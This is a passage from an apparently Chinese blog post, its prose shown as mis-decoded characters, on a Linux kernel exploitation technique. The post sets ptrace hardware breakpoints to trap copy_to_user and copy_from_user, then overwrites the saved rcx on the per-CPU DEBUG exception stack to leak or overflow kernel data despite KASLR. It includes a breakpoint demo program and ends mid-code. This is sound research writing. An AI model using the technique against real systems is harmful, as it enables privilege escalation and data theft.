class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">tss_setup_ist</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tss_struct *tss)</span><br>&#123;<br><span class="hljs-comment">/* Set up the per-CPU TSS IST stacks */</span><br>tss-&gt;x86_tss.ist[IST_INDEX_DF] = __this_cpu_ist_top_va(DF);<br>tss-&gt;x86_tss.ist[IST_INDEX_NMI] = __this_cpu_ist_top_va(NMI);<br>tss-&gt;x86_tss.ist[IST_INDEX_DB] = __this_cpu_ist_top_va(DB);<br>tss-&gt;x86_tss.ist[IST_INDEX_MCE] = __this_cpu_ist_top_va(MCE);<br><span class="hljs-comment">/* Only mapped when SEV-ES is active */</span><br>tss-&gt;x86_tss.ist[IST_INDEX_VC] = __this_cpu_ist_top_va(VC);<br><br></code></pre></td></tr></table></figure><p>åœ¨x86-64æ¶æ„ä¸‹ï¼Œä¸­æ–­æ ˆè¡¨ï¼ˆISTï¼ŒInterrupt Stack Tableï¼‰åŒ…å«äº†7ä¸ªæ¯ä¸ªCPUç‰¹æœ‰çš„æ¡ç›®ï¼Œç”¨äºå¤„ç†åŒ…æ‹¬åŒé‡æ•…éšœï¼ˆDouble Faultï¼‰ã€éå±è”½ä¸­æ–­ï¼ˆNMIï¼‰ã€è°ƒè¯•ï¼ˆDEBUGï¼‰ç­‰åœ¨å†…çš„ç‰¹å®šä¸­æ–­ç±»å‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * The index for the tss.ist[] array. The hardware limit is 7 entries.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>IST_INDEX_DF0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>IST_INDEX_NMI1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>IST_INDEX_DB2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>IST_INDEX_MCE3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>IST_INDEX_VC4</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿™5ç§ç‰¹å®šä¸­æ–­ä¸­ï¼Œç”±äºåœ¨ç”¨æˆ·æ¨¡å¼ä¸‹åˆ©ç”¨ptraceè®¾ç½®ç¡¬ä»¶æ–­ç‚¹èƒ½å¤Ÿæ¿€æ´»DEBUGä¸­æ–­ï¼Œç¡¬ä»¶æ–­ç‚¹çš„è§¦å‘ä¸ä»…å¯ä»¥åœ¨ç”¨æˆ·ç©ºé—´å®ç°ï¼Œä¹Ÿèƒ½åœ¨å†…æ ¸ç©ºé—´è¿›è¡Œã€‚è¿™ä½¿å¾—é€šè¿‡ç¡¬ä»¶æ–­ç‚¹å¼•å‘çš„ä¸­æ–­æˆä¸ºäº†åæœŸåº”ç”¨ä¸­æœ€ä¼˜é€‰é¡¹ã€‚</p><p>DEBUGå¯¹åº”çš„å¤„ç†å‡½æ•°ä¸º<code>asm_exc_debug()</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">const</span> __initconst <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">idt_data</span> <span class="hljs-title">def_idts</span>[] =</span> &#123;<br>.........<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>INTG(X86_TRAP_DB,asm_exc_debug),<br>.........<br>&#125;;<br></code></pre></td></tr></table></figure><p>å…·ä½“å®ç°ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs C">DEFINE_IDTENTRY_DEBUG(exc_debug)<br>&#123;<br>exc_debug_kernel(regs, debug_read_clear_dr6());<br>&#125;<br><br><span class="hljs-comment">/* User entry, runs on regular task stack */</span><br>DEFINE_IDTENTRY_DEBUG_USER(exc_debug)<br>&#123;<br>exc_debug_user(regs, debug_read_clear_dr6());<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><span class="hljs-comment">/* 32 bit does not have separate entry points. */</span><br>DEFINE_IDTENTRY_RAW(exc_debug)<br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> dr6 = debug_read_clear_dr6();<br><br><span class="hljs-keyword">if</span> (user_mode(regs))<br>exc_debug_user(regs, dr6);<br><span class="hljs-keyword">else</span><br>exc_debug_kernel(regs, dr6);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æ„‰å¿«çš„å†™ä¸ªdemoå•¦</p><p>é¦–å…ˆä¾¿æ˜¯è®¾ç½®ä¸€ä¸ªå·²çŸ¥å†…å­˜åœ°å€çš„ç¡¬ä»¶æ–­ç‚¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¢«<code>ptrace</code>è·Ÿè¸ªçš„å­è¿›ç¨‹å¯ä»¥é€šè¿‡ä»¥ä¸‹ä¸¤ç§é€”å¾„æ¿€æ´»ç¡¬ä»¶æ–­ç‚¹ï¼šå½“åœ¨ç”¨æˆ·ç©ºé—´è§¦å‘ç¡¬ä»¶æ–­ç‚¹æ—¶ï¼Œå°†ä¼šè°ƒç”¨<code>exc_debug_user()</code>å‡½æ•°è¿›è¡Œå¤„ç†ï¼›ç›¸åï¼Œè‹¥æ˜¯åœ¨æ‰§è¡Œç±»ä¼¼<code>uname()</code>è¿™æ ·çš„å‡½æ•°ï¼Œå…¶ä¸­æ¶‰åŠ<code>copy_from/to_user()</code>æ“ä½œæ—¶è§¦å‘ç¡¬ä»¶æ–­ç‚¹ï¼Œåˆ™ä¼šè°ƒç”¨<code>exc_debug_kernel()</code>å‡½æ•°è¿›è¡Œå¤„ç†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs C">SYSCALL_DEFINE1(uname, <span class="hljs-keyword">struct</span> old_utsname __user *, name)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">old_utsname</span> <span class="hljs-title">tmp</span>;</span><br><br><span class="hljs-keyword">if</span> (!name)<br><span class="hljs-keyword">return</span> -EFAULT;<br><br>down_read(&amp;uts_sem);<br><span class="hljs-built_in">memcpy</span>(&amp;tmp, utsname(), <span class="hljs-keyword">sizeof</span>(tmp));<br>up_read(&amp;uts_sem);<br><span class="hljs-keyword">if</span> (copy_to_user(name, &amp;tmp, <span class="hljs-keyword">sizeof</span>(tmp)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br><span class="hljs-keyword">if</span> (override_release(name-&gt;release, <span class="hljs-keyword">sizeof</span>(name-&gt;release)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">if</span> (override_architecture(name))<br><span class="hljs-keyword">return</span> -EFAULT;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»„åˆä¸€ä¸‹ï¼ˆğŸ‘´æœ¬æ¥æƒ³ç”¨å†…è”æ±‡ç¼–ä¸­çš„syscall_unameï¼Œè¿™æ ·å°±èƒ½å¾ˆæ¸…æ¥šçš„çœ‹å¯„å­˜å™¨çš„å€¼ï¼Œç»“æœå‘ç°è¿™æ ·å¥½åƒæ–­ä¸ä½å‘œå‘œï¼‰</p><p>PSï¼šç”±äº<code>cpu_entry_area</code>æ˜¯per-cpuçš„ï¼Œæ‰€ä»¥è¦ç»‘ä¸ªCPUï¼Œè°ƒè¯•çš„æ—¶å€™æ¢ç»‘ä¸åŒçš„CPUå‘ç°DEBUG Exception stackå®Œå…¨ä¸åŒ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/utsname.h&gt;</span></span><br><br><span class="hljs-type">char</span> data[<span class="hljs-number">0x10</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_cpu</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_hbp</span><span class="hljs-params">(<span class="hljs-type">pid_t</span> pid, <span class="hljs-type">void</span>* addr)</span>     <br>&#123;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg), addr) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr0: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(ptrace(PTRACE_POKEUSER,pid, offsetof(<span class="hljs-keyword">struct</span> user, u_debugreg) + <span class="hljs-number">56</span>, <span class="hljs-number">0xf0101</span>) == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Could not create hbp! ptrace dr7: %m\n&quot;</span>);<br>        kill(pid,<span class="hljs-number">9</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">pid_t</span> pid_hbp;<br><br>    bind_cpu(<span class="hljs-number">0</span>);<br>    <br>    pid_hbp = fork();<br>    <span class="hljs-keyword">if</span> (!pid_hbp)<br>    &#123;<br>        ptrace(PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>        raise(SIGSTOP);<br>        <span class="hljs-comment">// __asm__(</span><br>        <span class="hljs-comment">// &quot;mov r15,   0x11111111;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r14,   0x22222222;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r13,   0x33333333;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r12,   0x44444444;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rbp,   0x55555555;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rbx,   0x66666666;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r11,   0x77777777;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r10,   0x88888888;&quot;</span><br>        <span class="hljs-comment">// &quot;mov r9,    0x99999999;&quot;   </span><br>        <span class="hljs-comment">// &quot;mov r8,    0xaaaaaaaa;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rax,   0xbbbbbbbb;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rcx,   0xcccccccc;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rdx,   0xdddddddd;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rsi,   data;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rdi,   [rsi];&quot;</span><br>        <span class="hljs-comment">// // &quot;mov qword ptr [rdi], 1;&quot;</span><br>        <span class="hljs-comment">// &quot;mov rax,   63;&quot;</span><br>        <span class="hljs-comment">// &quot;syscall;&quot;</span><br>        <span class="hljs-comment">// );</span><br>        uname((<span class="hljs-type">void</span> *)data);<br>        <br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    waitpid(pid_hbp,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br>    create_hbp(pid_hbp, data);<br><br>    ptrace(PTRACE_CONT,pid_hbp,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);            <br>    waitpid(pid_hbp,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>æ‰“ä¸ªæ–­ç‚¹åœ¨<code>exc_debug_kernel</code>ä¸Šï¼ˆğŸ‘´ä¸çŸ¥é“ä¸ºä»€ä¹ˆğŸ‘´ä¸èƒ½ç”¨<code>b exc_debug_kernel</code>ç›´æ¥breakï¼Œåªèƒ½ç”¨æºç +lineæ‰èƒ½breakï¼‰</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202125518.png" style="zoom:50%;" /><p>è¿è¡Œdemoï¼Œè§‚çœ‹å¯„å­˜å™¨å‘ç°ç¡®å®<code>ip</code>æ–­åœ¨copy_to_userä¸­ï¼Œåœ¨è¿™ä¸ªä¸Šä¸‹æ–‡ä¸­ï¼Œ<code>di</code>å¯„å­˜å™¨ä½œä¸ºç›®æ ‡ç”¨æˆ·ç©ºé—´åœ°å€ï¼Œè€Œ<code>si</code>å¯„å­˜å™¨åˆ™ä»£è¡¨æºè‡ªå†…æ ¸ç©ºé—´çš„åœ°å€ï¼Œæ•°æ®ä»<code>si</code>æ‹·è´è‡³<code>di</code>ã€‚æ‹·è´æ“ä½œä»¥æ¯æ¬¡8å­—èŠ‚çš„æ–¹å¼é€æ­¥æ‰§è¡Œï¼Œ<code>cx</code>å¯„å­˜å™¨è®°å½•äº†å‰©ä½™éœ€è¦æ‹·è´çš„æ¬¡æ•°ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œåœ¨ç¡¬ä»¶æ–­ç‚¹è§¦å‘æ—¶ï¼Œ<code>rep movs</code>æŒ‡ä»¤å·²ç»æ‰§è¡Œäº†ä¸€è½®æ‹·è´ï¼Œå³å·²ç»å¤„ç†äº†8å­—èŠ‚çš„æ•°æ®ã€‚</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202130307.png" style="zoom:50%;" /><p>è€Œè¿™ä¸ªregså‚æ•°ï¼Œæ­£å¤„äº<code>struct cpu_entry_area</code>ä¸­çš„ <code>DEBUG Exception stack</code>ä¸­ï¼š</p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240202130731.png" style="zoom:50%;" /><p>å› æ­¤ï¼Œ<code>regs.cx</code>åœ¨æœªçŸ¥å†…æ ¸åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼ˆKASLRï¼‰çš„æƒ…å†µä¸‹ï¼Œæˆä¸ºäº†ä¸€ä¸ªæä½³çš„æ”»å‡»ç›®æ ‡ã€‚</p><p>è¿›ä¸€æ­¥æ¢è®¨<code>uname</code>å‡½æ•°è°ƒç”¨çš„æƒ…å†µï¼Œæˆ‘ä»¬å‘ç°<code>copy_to_user</code>å‡½æ•°æ“ä½œçš„æ•°æ®æºè‡ªä¸€ä¸ªä½äºå†…æ ¸æ ˆä¸Šçš„ä¸´æ—¶å¯¹è±¡ï¼š</p><p>åœ¨<code>copy_to_user</code>æ“ä½œè¿›è¡Œæ—¶ï¼Œå¦‚æœå¦ä¸€ä¸ªè¿›ç¨‹é€šè¿‡ä»»æ„åœ°å€å†™åœ¨è¢«æ”»å‡»ï¼ˆvictimï¼‰è¿›ç¨‹çš„ç¡¬ä»¶æ–­ç‚¹ä¸­æ–­å¤„ç†æœŸé—´æ›´æ”¹äº†<code>regs.cx</code>çš„å€¼ï¼Œå½“ä¸­æ–­å¤„ç†ç»“æŸï¼Œæ‰§è¡Œæµé‡æ–°è¿›å…¥<code>copy_to_user</code>æ—¶ï¼Œç”±äº<code>cx</code>å¯„å­˜å™¨çš„å€¼å·²è¢«ç¯¡æ”¹ï¼Œå°†ä¼šå¯¼è‡´å‘ç”¨æˆ·æ€ç¼“å†²åŒºæ‹·è´é¢å¤–çš„å†…å®¹ã€‚è¿™ä¾¿æœ‰äº†leak dirty dataçš„æœºä¼šæƒ¹ã€‚</p><p>ç›¸åŒçš„ï¼Œæ—¢ç„¶åœ¨copy_to_userçš„æ—¶å€™å¯ä»¥hack rcxï¼Œé‚£ä¹ˆåœ¨copy_from_userçš„æ—¶å€™åŒæ ·ä¹Ÿå¯ä»¥ï¼Œå¢åŠ å¤åˆ¶é•¿åº¦ï¼Œå°†æ„é€ å¥½çš„æ•°æ®å‡ºä¼ å…¥è¿›å»ã€‚p0 blogé‡Œå°±é€‰ç”¨äº†ä¸€ä¸ªprctlçš„å­å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">prctl_set_mm_map</span><span class="hljs-params">(<span class="hljs-type">int</span> opt, <span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> data_size)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">prctl_mm_map</span> <span class="hljs-title">prctl_map</span> =</span> &#123; .exe_fd = (u32)<span class="hljs-number">-1</span>, &#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_auxv[AT_VECTOR_SIZE];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br><span class="hljs-type">int</span> error;<br><br>BUILD_BUG_ON(<span class="hljs-keyword">sizeof</span>(user_auxv) != <span class="hljs-keyword">sizeof</span>(mm-&gt;saved_auxv));<br>BUILD_BUG_ON(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> prctl_mm_map) &gt; <span class="hljs-number">256</span>);<br><br><span class="hljs-keyword">if</span> (opt == PR_SET_MM_MAP_SIZE)<br><span class="hljs-keyword">return</span> put_user((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-keyword">sizeof</span>(prctl_map),<br>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __user *)addr);<br><br><span class="hljs-keyword">if</span> (data_size != <span class="hljs-keyword">sizeof</span>(prctl_map))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">if</span> (copy_from_user(&amp;prctl_map, addr, <span class="hljs-keyword">sizeof</span>(prctl_map)))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br>error = validate_prctl_map_addr(&amp;prctl_map);<br><span class="hljs-keyword">if</span> (error)<br><span class="hljs-keyword">return</span> error;<br><br><span class="hljs-keyword">if</span> (prctl_map.auxv_size) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Someone is trying to cheat the auxv vector.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!prctl_map.auxv ||<br>prctl_map.auxv_size &gt; <span class="hljs-keyword">sizeof</span>(mm-&gt;saved_auxv))<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-built_in">memset</span>(user_auxv, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(user_auxv));<br><span class="hljs-keyword">if</span> (copy_from_user(user_auxv,<br>   (<span class="hljs-type">const</span> <span class="hljs-type">void</span> __user *)prctl_map.auxv,<br>   prctl_map.auxv_size))<br><span class="hljs-keyword">return</span> -EFAULT;<br><br><span class="hljs-comment">/* Last entry must be AT_NULL as specification requires */</span><br>user_auxv[AT_VECTOR_SIZE - <span class="hljs-number">2</span>] = AT_NULL;<br>user_auxv[AT_VECTOR_SIZE - <span class="hljs-number">1</span>] = AT_NULL;<br>&#125;<br><br><span class="hljs-keyword">if</span> (prctl_map.exe_fd != (u32)<span class="hljs-number">-1</span>) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Check if the current user is checkpoint/restore capable.</span><br><span class="hljs-comment"> * At the time of this writing, it checks for CAP_SYS_ADMIN</span><br><span class="hljs-comment"> * or CAP_CHECKPOINT_RESTORE.</span><br><span class="hljs-comment"> * Note that a user with access to ptrace can masquerade an</span><br><span class="hljs-comment"> * arbitrary program as any executable, even setuid ones.</span><br><span class="hljs-comment"> * This may have implications in the tomoyo subsystem.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> 